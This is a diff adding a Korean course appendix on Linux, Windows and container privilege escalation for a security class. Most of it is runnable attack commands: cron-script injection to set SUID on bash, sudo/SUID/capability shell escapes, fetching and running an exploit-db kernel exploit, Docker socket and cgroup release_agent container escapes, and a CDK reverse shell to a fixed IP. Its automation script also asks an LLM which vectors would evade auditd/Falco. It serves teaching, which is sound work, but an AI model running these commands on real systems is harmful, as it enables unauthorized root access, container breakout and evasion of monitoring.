@@ -805,3 +805,320 @@ graph LR
 
 **학생 액션**: winpeas 적용.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 06 권한상승 체인)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | LinPEAS (자동 enum) | LinPEAS / lse |
+| s2 | WinPEAS (Win) | WinPEAS / Seatbelt |
+| s3 | linux-exploit-suggester | les |
+| s4 | pspy (실시간 cron) | pspy64 |
+| s5 | GTFOBins 매핑 | gtfobins-cli |
+| s6 | Capability 분석 | getcap + 자체 분석 |
+| s7 | Container escape | deepce / amicontained |
+| s8 | Auto privesc chain | linpeas + les + 자체 stitcher |
+
+### 학생 환경 준비
+
+```bash
+# === LinPEAS / WinPEAS (PEASS-ng) ===
+mkdir -p ~/peass && cd ~/peass
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.exe -o winPEAS.exe
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -o winPEASany.exe
+
+# === lse (Linux Smart Enum) ===
+git clone https://github.com/diego-treitos/linux-smart-enumeration ~/lse
+
+# === linux-exploit-suggester ===
+git clone https://github.com/mzet-/linux-exploit-suggester ~/les
+ln -sf ~/les/linux-exploit-suggester.sh ~/.local/bin/les
+
+# === pspy (cron 실시간) ===
+mkdir -p ~/.local/bin
+curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o ~/.local/bin/pspy64
+chmod +x ~/.local/bin/pspy64
+
+# === GTFOBins CLI ===
+pip install gtfobins                                       # gtfobins lookup CLI
+
+# === deepce / amicontained (container escape) ===
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh
+chmod +x /tmp/deepce.sh
+
+go install github.com/genuinetools/amicontained@latest
+
+# === CDK (container privesc) ===
+git clone https://github.com/cdk-team/CDK ~/cdk
+```
+
+### Linux Privesc Chain (정공 8 단계)
+
+```bash
+# === Step 1: 자동 enum (LinPEAS — 가장 종합) ===
+~/peass/linpeas.sh -a -j > /tmp/linpeas-result.json
+
+# 또는 짧게 (interesting 만)
+~/peass/linpeas.sh -a 2>&1 | grep -E '\[\!\]|\[\+\]'
+
+# 카테고리:
+# - System info
+# - Files with capabilities
+# - SUID/SGID
+# - Sudo (sudo -l)
+# - Cron jobs
+# - Software (curl, nc 등)
+# - Sensitive files
+# - User information
+# - Software vulnerabilities
+
+# === Step 2: linux-exploit-suggester (커널 매칭) ===
+~/les/linux-exploit-suggester.sh --uname --gcc
+
+# 출력:
+# [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+# [+] Exposure: highly probable
+# [+] Tags: ubuntu=22.04, kernel=5.15
+# [+] Download URL: https://www.exploit-db.com/exploits/50979
+
+# 또는 specific kernel
+~/les/linux-exploit-suggester.sh --kernel 5.15.0-83
+
+# === Step 3: pspy (cron 실시간 모니터) ===
+pspy64 -p -f &
+# 5분 정도 모니터링
+# 출력 예 (root cron 발견):
+# 2026-05-02 10:05:01 CMD: UID=0    PID=12345 /usr/bin/python3 /opt/secret.py
+# → root 가 5분마다 실행 → /opt/secret.py 점검
+
+ls -la /opt/secret.py                                      # 권한 확인
+# -rwxrwxrwx (world-writable!)
+
+# 악용:
+echo 'import os; os.system("chmod +s /bin/bash")' >> /opt/secret.py
+# 5분 대기 → /bin/bash 가 SUID
+/bin/bash -p
+# # whoami → root!
+
+# === Step 4: Sudo + GTFOBins ===
+sudo -l
+# (root) NOPASSWD: /usr/bin/find
+
+# GTFOBins 매칭
+gtfobins find sudo
+# 출력: sudo find . -exec /bin/sh \; -quit
+
+sudo find . -exec /bin/sh \; -quit
+# # whoami → root
+
+# === Step 5: SUID + GTFOBins ===
+find / -perm -4000 -type f 2>/dev/null
+
+# 비정상 SUID 발견 (예: vim)
+gtfobins vim suid
+# vim -c ':!/bin/sh -p'
+
+vim -c ':!/bin/sh -p'
+
+# === Step 6: Capabilities ===
+getcap -r / 2>/dev/null
+# /usr/bin/python3.10 = cap_setuid+ep
+
+# 악용
+python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# # whoami → root
+
+# === Step 7: Writable PATH/file ===
+find / -writable -type f 2>/dev/null | head
+
+# /etc/cron.d/* 가 writable → 자체 cron 추가
+echo "* * * * * root /bin/bash -c 'chmod +s /bin/bash'" | sudo tee /etc/cron.d/own
+# 1분 대기
+
+# === Step 8: 커널 exploit (마지막 수단) ===
+# CVE-2022-32250 (nft_object UAF) 컴파일 + 실행
+wget https://www.exploit-db.com/raw/50979 -O /tmp/exploit.c
+gcc -o /tmp/exploit /tmp/exploit.c
+chmod +x /tmp/exploit
+/tmp/exploit
+# # whoami → root
+```
+
+### Windows Privesc (WinPEAS)
+
+```cmd
+:: WinPEAS (cmd 또는 PowerShell)
+winPEAS.exe
+
+:: 또는 PowerShell
+powershell -ep bypass -c ".\winPEAS.exe"
+
+:: 카테고리:
+:: - System info
+:: - Domain info
+:: - Users (인터링 사용자, 관리자)
+:: - Process (suspicious processes)
+:: - Services (modifiable, unquoted path)
+:: - AlwaysInstallElevated
+:: - Stored credentials
+:: - Scheduled tasks
+:: - Hot-keys (키 후킹)
+```
+
+### Container Escape (deepce)
+
+```bash
+# === 1. Container 환경 확인 ===
+[ -f /.dockerenv ] && echo "In container"
+mount | grep -E "docker|cgroup|overlay"
+
+cat /proc/1/cgroup                                         # /docker/... 보이면 컨테이너
+
+# === 2. deepce (자동 점검) ===
+bash /tmp/deepce.sh
+
+# 검사 항목:
+# - Privileged container?
+# - Mounted host dirs?
+# - Sock mount (/var/run/docker.sock)?
+# - Capabilities (SYS_ADMIN, SYS_PTRACE)?
+# - Notify_on_release 악용?
+# - core_pattern 악용?
+# - Old runc CVE (CVE-2019-5736)?
+
+# === 3. amicontained ===
+amicontained
+# 출력:
+# Container Runtime: docker
+# Has Namespaces: pid: true, user: false ← user namespace 없음 (위험)
+# AppArmor Profile: docker-default
+# Capabilities: ...
+# Seccomp: enabled
+
+# === 4. Docker socket abuse (sock 이 mount 된 경우) ===
+ls -la /var/run/docker.sock
+# 만약 -rw-rw---- root docker 이고 우리가 docker group 이면:
+docker run -it --rm -v /:/host alpine chroot /host bash
+# → host 의 root!
+
+# === 5. Privileged container ===
+[ -w /sys/fs/cgroup/cgroup.subtree_control ] && echo "Privileged!"
+
+# Privileged 면 host root 가능:
+mkdir -p /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir -p /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+# host 의 release_agent script 실행
+
+# === 6. CDK (container privesc 통합 toolkit) ===
+~/cdk/bin/cdk evaluate                                     # 모든 vector 자동
+~/cdk/bin/cdk run shim-pwn reverse 192.168.0.112 4444
+```
+
+### 통합 자동 privesc chain (자체 stitcher)
+
+```bash
+#!/bin/bash
+# /opt/scripts/auto-privesc.sh
+# Linux 자동 privesc chain
+
+DIR=/tmp/privesc-$(date +%Y%m%d-%H%M)
+mkdir -p $DIR
+
+# === Step 1: LinPEAS (5분) ===
+~/peass/linpeas.sh -a -j > $DIR/01-linpeas.json &
+LP_PID=$!
+
+# === Step 2: pspy 백그라운드 (5분) ===
+pspy64 -p -f > $DIR/02-pspy.log &
+PSPY_PID=$!
+
+# === Step 3: linux-exploit-suggester ===
+~/les/linux-exploit-suggester.sh --uname --gcc > $DIR/03-les.txt
+
+# === Step 4: GTFOBins 매핑 ===
+sudo -l 2>/dev/null > $DIR/04-sudo.txt
+
+while read line; do
+    binary=$(echo $line | grep -oE '/usr/bin/[a-zA-Z0-9_-]+' | head -1)
+    if [ -n "$binary" ]; then
+        gtfobins $(basename $binary) sudo 2>/dev/null
+    fi
+done < $DIR/04-sudo.txt > $DIR/05-gtfobins.txt
+
+# === Step 5: SUID + GTFOBins ===
+find / -perm -4000 -type f 2>/dev/null > $DIR/06-suid.txt
+while read suid; do
+    binary=$(basename $suid)
+    gtfobins $binary suid 2>/dev/null
+done < $DIR/06-suid.txt > $DIR/07-suid-gtfobins.txt
+
+# === Step 6: Capability ===
+getcap -r / 2>/dev/null > $DIR/08-capabilities.txt
+
+# === Step 7: Container check ===
+if [ -f /.dockerenv ]; then
+    bash /tmp/deepce.sh > $DIR/09-deepce.txt
+    amicontained > $DIR/10-amicontained.txt
+fi
+
+# === Step 8: 결과 자동 분석 (LLM 으로) ===
+# 모든 파일 → LLM → 우선순위 추천
+python3 << PEOF > $DIR/00-recommendations.md
+from langchain_ollama import OllamaLLM
+import json, glob
+
+llm = OllamaLLM(model="gemma3:4b")
+
+# 모든 enum 결과 합산
+all_data = ""
+for f in glob.glob("$DIR/*.txt") + glob.glob("$DIR/*.json"):
+    with open(f) as file:
+        all_data += f"\n=== {f} ===\n{file.read()[:2000]}\n"
+
+prompt = f"""다음은 Linux privesc enumeration 결과입니다:
+{all_data[:10000]}
+
+분석 결과 작성 (markdown):
+1. **즉시 시도할 vector** (top 3)
+2. **백업 plan** (다른 방법)
+3. **Stealth 고려** (auditd/Falco 가 탐지할 vector)
+4. **명령** (각 vector 의 정확한 명령)
+"""
+
+print(llm.invoke(prompt))
+PEOF
+
+echo "=== Privesc 분석 완료 — $DIR/00-recommendations.md ==="
+```
+
+### Privesc 권장 순서 (실무)
+
+```
+1. LinPEAS (5분) — 자동 종합 enum
+   ↓
+2. pspy 백그라운드 (5분 이상) — cron 발견
+   ↓
+3. Sudo + GTFOBins (가장 빠름)
+   ↓
+4. SUID + GTFOBins (가장 흔함)
+   ↓
+5. Capability (최근 자주)
+   ↓
+6. Writable cron / PATH (가끔)
+   ↓
+7. 커널 exploit (마지막 수단 — 실패 시 panic 위험)
+   ↓
+8. Container escape (있는 경우만)
+```
+
+학생은 본 6주차에서 **LinPEAS + WinPEAS + lse + linux-exploit-suggester + pspy + GTFOBins + deepce + amicontained + CDK** 9 도구로 Linux/Win/Container privesc 의 advanced chain (자동 enum → 매칭 → 단계적 시도) 을 OSS 만으로 익힌다.
